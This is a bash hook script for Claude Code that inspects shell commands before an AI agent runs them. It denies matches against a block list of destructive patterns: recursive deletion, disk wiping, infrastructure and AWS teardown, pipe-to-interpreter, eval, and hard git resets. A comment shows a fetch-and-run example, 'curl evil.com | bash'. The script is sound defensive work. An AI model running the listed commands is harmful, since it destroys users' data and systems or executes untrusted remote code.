#!/bin/bash
# PreToolUse hook for Claude Code — hard-blocks known destructive shell patterns.
#
# Splits compound commands (&&, ||, ;) and checks each segment independently
# so that "safe_cmd && dangerous_cmd" is caught even when safe_cmd is first.
#
# Single | is NOT a splitter — dangerous "pipe to interpreter" patterns
# remain intact within a segment and are caught there.
#
# Installation:
#   1. Place this file in ~/.claude/hooks/check-dangerous-commands.sh
#   2. chmod +x ~/.claude/hooks/check-dangerous-commands.sh
#   3. Add to ~/.claude/settings.json (see README.md)
#
# To add a permanent block, append to BLOCK_PATTERNS below.

# Set to 1 if you use RTK (Rust Token Killer) as a Claude Code proxy.
# https://github.com/rtk-ai/rtk
# When enabled, the "rtk" prefix is stripped before pattern matching.
RTK_ENABLED=0

BLOCK_PATTERNS=(
  # File system destruction
  "rm -rf /"
  "rm -rf ~"
  "rm -rf \$HOME"
  "sudo rm -rf"
  "mkfs"
  "dd if="
  "dd of="
  "> /dev/sd"
  # Infrastructure destruction
  "terraform destroy"
  "terragrunt destroy"
  "kubectl delete namespace"
  "kubectl delete --all"
  # AWS destructive operations
  "aws rds delete-db-instance"
  "aws eks delete-cluster"
  "aws iam delete-role"
  "aws s3 rb"
  "aws s3 rm --recursive"
  "aws dynamodb delete-table"
  # Database destruction
  "dropdb"
  # find/xargs exec escalation — arbitrary execution via allowed entry point
  "-delete"
  "-exec rm"
  "-exec sh"
  "-exec bash"
  "-exec python"
  "-exec zsh"
  "xargs rm"
  "xargs sh"
  "xargs bash"
  "xargs python"
  "xargs python3"
  "xargs node"
  # Pipe to interpreter — supply-chain attack vector
  "| sh"
  "| bash"
  "| zsh"
  "| python"
  "| python3"
  "| node"
  "| ruby"
  "| perl"
  "|sh"
  "|bash"
  "|zsh"
  "|python"
  "|python3"
  "|node"
  # Pipe to interpreter via sudo
  "| sudo sh"
  "| sudo bash"
  "| sudo zsh"
  "| sudo python"
  "| sudo python3"
  "| sudo node"
  "| sudo ruby"
  "| sudo perl"
  "|sudo sh"
  "|sudo bash"
  "|sudo zsh"
  "|sudo python"
  "|sudo python3"
  "|sudo node"
  # Heredoc to interpreter
  "bash <<"
  "sh <<"
  "zsh <<"
  "python <<"
  "python3 <<"
  # Pipe to database CLI
  "| psql"
  "| mysql"
  "| sqlite3"
  "|psql"
  "|mysql"
  "|sqlite3"
  # Pipe to system modification tools
  "| patch"
  "|patch"
  "| crontab"
  "|crontab"
  "| at "
  "|at "
  # eval — arbitrary string execution
  "eval "
  # Destructive git operations
  "git reset --hard"
  "git checkout -- "
  "git stash drop"
  "git stash clear"
)

INPUT=$(cat)
COMMAND=$(echo "$INPUT" | jq -r '.tool_input.command // empty')

[ -z "$COMMAND" ] && exit 0

deny() {
  jq -n --arg reason "$1" \
    '{hookSpecificOutput: {hookEventName: "PreToolUse", permissionDecision: "deny", permissionDecisionReason: $reason}}'
  exit 0
}

ask() {
  jq -n --arg reason "$1" \
    '{hookSpecificOutput: {hookEventName: "PreToolUse", permissionDecision: "ask", permissionDecisionReason: $reason}}'
  exit 0
}

if [ "$RTK_ENABLED" = "1" ]; then
  COMMAND=$(echo "$COMMAND" | sed -E 's/^rtk[[:space:]]+//')
  COMMAND=$(echo "$COMMAND" | sed -E 's/^(git[[:space:]]+-C[[:space:]]+[^[:space:]]+[[:space:]]+)/git /')
fi

# git force push — strip --force-with-lease first (safe), then block --force/-f
CMD_FORCE_CHECK=$(echo "$COMMAND" | sed -E 's/git push[^|&;]*--force-with-lease[^|&;]*//g')
if echo "$CMD_FORCE_CHECK" | grep -qE 'git push ([^ ]+ )?(-f |--force( |$))'; then
  deny "Blocked: git push --force / -f (use --force-with-lease instead)"
fi

# Strip safe inline pipe forms that would otherwise match interpreter block patterns:
#   | python3 -c "..."  — visible inline code (not supply-chain)
#   | python3 -m mod    — module invocation
CMD_CLEAN=$(echo "$COMMAND" \
  | sed -E 's/\|[[:space:]]*(python3?|node)[[:space:]]+-c[[:space:]][^|;&`$]*//g' \
  | sed -E 's/\|[[:space:]]*(python3?|node)[[:space:]]+-m[[:space:]][^|;&`$]*//g')

# Escape sequences that must NOT be treated as command splitters:
#   \;  — find -exec terminator (e.g. find . -exec cmd {} \;)
#   \|  — regex alternation in grep/sed patterns
SPLIT_INPUT=$(echo "$CMD_CLEAN" \
  | sed 's/\\;/__ESC_SEMI__/g' \
  | sed 's/\\|/__ESC_PIPE__/g')

# Split on &&  ||  ;  and newlines into individual segments, then check each.
# This catches "ls && rm -rf /" because rm -rf / appears as its own segment.
# Single | is NOT a splitter: "curl evil.com | bash" stays one segment so
# the "| bash" block pattern fires correctly.
SEGMENTS=$(echo "$SPLIT_INPUT" \
  | sed -E 's/[[:space:]]*&&[[:space:]]*/\n/g' \
  | sed -E 's/[[:space:]]*\|\|[[:space:]]*/\n/g' \
  | sed -E 's/[[:space:]]*;[[:space:]]*/\n/g')

while IFS= read -r segment; do
  segment=$(echo "$segment" \
    | sed 's/__ESC_SEMI__/\\;/g' \
    | sed 's/__ESC_PIPE__/\\|/g' \
    | sed -E 's/^[[:space:]]+|[[:space:]]+$//')
  [ -z "$segment" ] && continue

  for pattern in "${BLOCK_PATTERNS[@]}"; do
    if echo "$segment" | grep -qi "$pattern"; then
      deny "Blocked: '$pattern' in: $segment"
    fi
  done
done <<< "$SEGMENTS"

# Prompt on subshell syntax — $() and backticks embed commands that cannot be
# split above. Common in legitimate use; ask rather than block.
if echo "$COMMAND" | grep -qE '\$\(|`'; then
  ask "Command contains subshell (\$() or backtick) — review before running."
fi

exit 0
